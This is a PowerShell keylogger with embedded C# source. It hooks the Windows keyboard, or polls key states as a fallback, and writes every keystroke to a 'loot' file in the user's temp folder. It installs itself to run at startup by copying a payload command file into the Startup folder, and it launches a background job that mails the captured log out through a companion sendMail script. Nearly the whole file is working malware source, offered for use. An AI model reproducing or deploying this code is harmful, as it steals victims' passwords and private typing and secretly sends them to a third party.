[CmdletBinding()]
Param (
	[Parameter(Mandatory = $false)]
	[ValidateSet($True, "Startup", "TaskScheduler", "Registry", "All")]
	[string]$Type = "Startup"
)


$validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
$sendMailPath = "$PWD\sendMail.ps1";

function Check-DotNetFramework {
    $dotNetKey = 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full'
    $dotNetVersion = $null

    if (Test-Path $dotNetKey) {
        $version = (Get-ItemProperty -Path $dotNetKey -Name Release).Release
        $dotNetVersion = $version
    }

    # .NET Framework 4.0 and later versions have a release value >= 379893
    if ($dotNetVersion -ge 379893) {
        return $true
    }
    
    return $false
}

function KeyLog {
	if (Check-DotNetFramework) {
		ComplexKeyLog
	} else {
		SimpleKeyLog
	}
}

function ComplexKeyLog($LogFile="$env:temp\$env:username.txt") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force
	$source = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Globalization; // ??? ok..

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
	private const int VK_RETURN = 0x0D;  // Enter key
	private const int VK_SPACE = 0x20;   // Spacebar
	private const int VK_OEM_PERIOD = 0xBE;   // For any country/region, the "." key
	private const int VK_LSHIFT = 0xA0;   
	private const int VK_RSHIFT = 0xA1;   
	private const int VK_CAPITAL = 0x14;   
	private const int VK_BACK = 0x08;
	private const int VK_TAB = 0x09;
	private const int VK_LEFT = 0x25;
	private const int VK_UP = 0x26;
	private const int VK_RIGHT = 0x27;
	private const int VK_DOWN = 0x28;
	private const int VK_DELETE = 0x2E;

    public static StreamWriter logFile;
    public static string logFileName;
    public static string baseName;
	public const long MaxFileSizeBytes = 19 * 1024 * 1024; // Maximum file size of 19MB to avoid file size attachment issues

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

	public static bool isPrintable(string str)
    {
        if (string.IsNullOrEmpty(str))
        {
            return false;
        }

        foreach (char c in str)
        {
            // Check if the character is a control character
            if (IsKeyboardControlCharacter(c) || Char.IsControl(c))
            {
                return false;
            }
        }

        return true;
    }

    public static bool IsKeyboardControlCharacter(char c)
{
        // Check for well-known keyboard-related control characters
        if (c == '\u0000' || // Null character
            c == '\u0001' || // Start of Heading
            c == '\u0002' || // Start of Text
            c == '\u0003' || // End of Text
            c == '\u0004' || // End of Transmission
            c == '\u0005' || // Enquiry
            c == '\u0006' || // Acknowledgment
            c == '\u0007' || // Bell (Alert)
            c == '\u0008' || // Backspace
            c == '\u0009' || // Horizontal Tab
            c == '\u000A' || // Line Feed (New Line)
            c == '\u000B' || // Vertical Tab
            c == '\u000C' || // Form Feed
            c == '\u000D' || // Carriage Return
            c == '\u001B' || // Escape
            c == '\u007F' || // Delete
            (c >= '\u0080' && c <= '\u009F')) // Extended ASCII (Control)
        {
            return true;
        }
        
        return false;
    }

	public static void RotateLogFileIfNeeded() {
		FileInfo fileInfo = new FileInfo(logFileName);
        if (fileInfo.Length >= MaxFileSizeBytes) {
            logFile.Close();
            string newLogFileName = Path.GetFileNameWithoutExtension(baseName) + "-" + 
                                    DateTime.Now.ToString("yyyyMMddHHmmss") + 
                                    Path.GetExtension(baseName);
            logFileName = Path.Combine(Path.GetDirectoryName(baseName), newLogFileName);
            logFile = File.AppendText(logFileName);
            logFile.AutoFlush = true;
        }
	}
    public static void Main(string[] args) {
	  if (args.Length > 0) {
	 	baseName = args[0];
        logFileName = Path.GetFileNameWithoutExtension(baseName) + "-" + 
                                    DateTime.Now.ToString("yyyyMMddHHmmss") + 
                                    Path.GetExtension(baseName);
        logFileName = Path.Combine(Path.GetDirectoryName(baseName), logFileName);
	  	logFile = File.AppendText(logFileName);
      	logFile.AutoFlush = true;

      	hookId = SetHook(hookProc);
      	Application.Run();
      	UnhookWindowsHookEx(hookId);
	} else {
		}
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
	  	RotateLogFileIfNeeded();
        int vkCode = Marshal.ReadInt32(lParam);

		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
        bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		byte [] keyboardState = new byte[256];
		StringBuilder output = new StringBuilder(2);
		GetKeyboardState(keyboardState);


		char[] buffer = new char[2];
		int scanCode = MapVirtualKey((uint)vkCode, 0);

		int result = ToUnicode((uint)vkCode, (uint)scanCode, keyboardState, output, output.Capacity, 0);
		bool printable = true;
		if (result > 0) {
		 	string outputStr = output.ToString();
			if (isPrintable(outputStr)) {
				logFile.Write(outputStr);	
			} else {
				printable = false;
			}
		} else { printable = false; }
		if (printable == false) {
			string keyChar;
		if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z) { // Alphabet characters
			if (shiftPressed ^ capsLockActive) 
			{
				keyChar = ((char)vkCode).ToString().ToUpper();
			} 
			else 
			{
				keyChar = ((char)vkCode).ToString().ToLower();
			}
			logFile.Write(keyChar);
		} else if (vkCode >= 96 && vkCode <= 111) { // Number pad characters
			switch(vkCode) {
			case 96: keyChar = "0"; break;
			case 97: keyChar = "1"; break;
			case 98: keyChar = "2"; break;
			case 99: keyChar = "3"; break;
			case 100: keyChar = "4"; break;
			case 101: keyChar = "5"; break;
			case 102: keyChar = "6"; break;
			case 103: keyChar = "7"; break;
			case 104: keyChar = "8"; break;
			case 105: keyChar = "9"; break;
			case 106: keyChar = "*"; break;
			case 107: keyChar = "+"; break;
			case 108: keyChar = "|"; break;
			case 109: keyChar = "-"; break;
			case 110: keyChar = "."; break;
			case 111: keyChar = "/"; break;
			default: keyChar = ((char)vkCode).ToString(); break;
			} 
			logFile.Write(keyChar);	
		} else if ( (vkCode >= 48 && vkCode <= 57) || (vkCode >= 186 && vkCode <= 192) || (vkCode >= 219 && vkCode <= 222) ) {
			if (shiftPressed) {
			    switch (vkCode) {
			    case 48: keyChar = ")"; break;
			    case 49: keyChar = "!"; break;
			    case 50: keyChar = "@"; break;
			    case 51: keyChar = "#"; break;
			    case 52: keyChar = "$"; break;
			    case 53: keyChar = "%"; break;
			    case 54: keyChar = "^"; break;
			    case 55: keyChar = "&"; break;
			    case 56: keyChar = "*"; break;
			    case 57: keyChar = "("; break;
			    case 186: keyChar = ":"; break;
			    case 187: keyChar = "+"; break;
			    case 188: keyChar = "<"; break;
			    case 189: keyChar = "_"; break;
			    case 190: keyChar = ">"; break;
			    case 191: keyChar = "?"; break;
			    case 192: keyChar = "~"; break;
			    case 219: keyChar = "{"; break;
			    case 220: keyChar = "|"; break;
			    case 221: keyChar = "}"; break;
			    case 222: keyChar = "<Double Quotes>"; break;
				default: keyChar = ((char)vkCode).ToString(); break;
			    }
			} else {
			    switch(vkCode) {
			    case 48: keyChar = "0"; break;
			    case 49: keyChar = "1"; break;
			    case 50: keyChar = "2"; break;
			    case 51: keyChar = "3"; break;
			    case 52: keyChar = "4"; break;
			    case 53: keyChar = "5"; break;
			    case 54: keyChar = "6"; break;
			    case 55: keyChar = "7"; break;
			    case 56: keyChar = "8"; break;
			    case 57: keyChar = "9"; break;
			    case 186: keyChar = ";"; break;
			    case 187: keyChar = "="; break;
			    case 188: keyChar = ","; break;
			    case 189: keyChar = "-"; break;
			    case 190: keyChar = "."; break;
			    case 191: keyChar = "/"; break;
			    case 192: keyChar = "``"; break;
			    case 219: keyChar = "["; break;
			    case 220: keyChar = "\\"; break;
			    case 221: keyChar = "]"; break;
			    case 222: keyChar = "<Single Quote>"; break;
				default: keyChar = ((char)vkCode).ToString(); break;
				}	
			}
			logFile.Write(keyChar);
		} else { 
		 switch (vkCode) {
           case (int)Keys.F1: logFile.Write("<F1>"); break;
           case (int)Keys.F2: logFile.Write("<F2>"); break;
           case (int)Keys.F3: logFile.Write("<F3>"); break;
           case (int)Keys.F4: logFile.Write("<F4>"); break;
           case (int)Keys.F5: logFile.Write("<F5>"); break;
           case (int)Keys.F6: logFile.Write("<F6>"); break;
           case (int)Keys.F7: logFile.Write("<F7>"); break;
           case (int)Keys.F8: logFile.Write("<F8>"); break;
           case (int)Keys.F9: logFile.Write("<F9>"); break;
           case (int)Keys.F10: logFile.Write("<F10>"); break;
           case (int)Keys.F11: logFile.Write("<F11>"); break;
           case (int)Keys.F12: logFile.Write("<F12>"); break;
           case (int)Keys.PrintScreen: logFile.Write("<Print Screen>"); break;
           case (int)Keys.Scroll: logFile.Write("<Scroll Lock>"); break;
           case (int)Keys.Pause: logFile.Write("<Pause/Break>"); break;
           case (int)Keys.Insert: logFile.Write("<Insert>"); break;
           case (int)Keys.Home: logFile.Write("<Home>"); break;
           case (int)Keys.End: logFile.Write("<End>"); break;
           case (int)Keys.PageUp: logFile.Write("<Page Up>"); break;
           case (int)Keys.PageDown: logFile.Write("<Page Down>"); break;
           case (int)Keys.Escape: logFile.Write("<Esc>"); break;
           case (int)Keys.NumLock: logFile.Write("<Num Lock>"); break;
           case (int)Keys.Capital: break;
           case (int)Keys.Tab: logFile.Write("<Tab>"); break;
           case (int)Keys.Back: logFile.Write("<Backspace>"); break;
           case (int)Keys.Delete: logFile.Write("<Delete>"); break;
           case (int)Keys.Enter: logFile.WriteLine(""); break;
           case (int)Keys.Space: logFile.Write(" "); break;
           case (int)Keys.Left: logFile.Write("<Left>"); break;
           case (int)Keys.Up: logFile.Write("<Up>"); break;
           case (int)Keys.Right: logFile.Write("<Right>"); break;
           case (int)Keys.Down: logFile.Write("<Down>"); break;
           case (int)Keys.LMenu:
           case (int)Keys.RMenu: logFile.Write("<Alt>"); break;
           case (int)Keys.LWin:
           case (int)Keys.RWin: logFile.Write("<Windows Key>"); break;
           case (int)Keys.LShiftKey:
           case (int)Keys.RShiftKey: break;
           case (int)Keys.LControlKey:
           case (int)Keys.RControlKey: logFile.Write("<Ctrl>"); break;
           default: logFile.Write("<KEY_" + vkCode + ">"); break;
                    }
			}	
		}
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern int MapVirtualKey(uint uCode, uint uMapType);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int ToUnicode(
		uint wVirtKey, 
		uint wScanCode, 
		byte[] lpkeystate, 
		[Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
		int wBuffSize,
		uint wFlags
		);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@
Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
$logFileName = "$env:temp\$env:username.txt"
[KeyLogger.Program]::Main($logFileName);
}

function SimpleKeyLog($LogFile="$env:temp\$env:username.txt") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force

	$APIsigs = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
	$TypeName = "Win32_" + [guid]::NewGuid().ToString("N")
	$API = Add-Type -MemberDefinition $APIsigs -Name $TypeName -Namespace "API" -PassThru

	$LogBuilder = New-Object -TypeName System.Text.StringBuilder
	# The idea is to continuously scan each key and check whether it is pressed or not. Not the most accurate, but the simplest
	try {
		while ($true) {
			# Capture keystroke logic
			Start-Sleep -Milliseconds 80
			for ($ascii = 0; $ascii -le 254; $ascii++) {
				$KeyState = $API::GetAsyncKeyState($ascii)
				if (($KeyState -band 0x8000) -ne 0) { # Highest bit toggled means key pressed
					$hideLogBuilderOutput = $LogBuilder.Clear()
					$KeyboardState = New-Object Byte[] 256
					$storeAndHideState = $API::GetKeyboardState($KeyboardState)
					$mapKey = $API::MapVirtualKey($ascii, 3)
                    $result = $API::ToUnicode($ascii, $mapKey, $KeyboardState, $LogBuilder, $LogBuilder.Capacity, 0)

					if ($result -gt 0) {
						$character = $LogBuilder.ToString()

						if ($ascii -eq 13) { # Enter key
							Add-Content -Path $LootFile -Value "`r`n"
						} else {
						Add-Content -Path $LootFile -Value $character -NoNewline
						}
					}

				}		
			}

		}
	} 
	catch {
		#Write-Error "An error occured: $_"
	}	
	finally {
		#Write-Host "Finally reached: $_"
		SendMail
	}
}

function persistStartup() {
	
	$trigger = "payload.cmd"
	$triggerPath = "$PWD\$trigger"
	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"	
	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force

	$script = "keyLogger.ps1"
	$scriptPath = "$PWD\$script"
	$scriptDestinationPath = "$env:TEMP\$script"	
	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
	
	$scheduler = "sendMail.ps1"
	$schedulerPath = "$PWD\$scheduler"
	$schedulerDestinationPath = "$env:TEMP\$scheduler"	
	Copy-Item -Path $schedulerPath -Destination $schedulerDestinationPath -Force
	
}

function persistTaskScheduler() {
	
}

function persistRegistry() {
}

function persistAll() {
	persistStartup
	persistTaskScheduler
	persistRegistry
}


function CreatePersistance($Type) {
	
	
	switch ($Type) {
			
		"Startup" {
			# Place your specific logic for Startup here
			#Write-Host "[DEBUG][Persistance] Persisting startup."
			persistStartup
		}
		"TaskScheduler" {
			# Place your specific logic for TaskScheduler here
			persistTaskScheduler
		}
		"Registry" {
			# Place your specific logic for Registry here
			persistRegistry
		}
		"All" {
			# Place your specific logic for Registry here
			persistAll
		}
		default {
			#Write-Host "Unknown option selected."
		}
	}
	
	
}

Start-Job -ScriptBlock {
	. $using:sendMailPath
	SendMail
	ScheduleMail -MinutesInterval $Interval
	} -InitializationScript { 
				$ProgressPreference = 'SilentlyContinue'; 
				} | Out-Null
CreatePersistance -Type $Type
KeyLog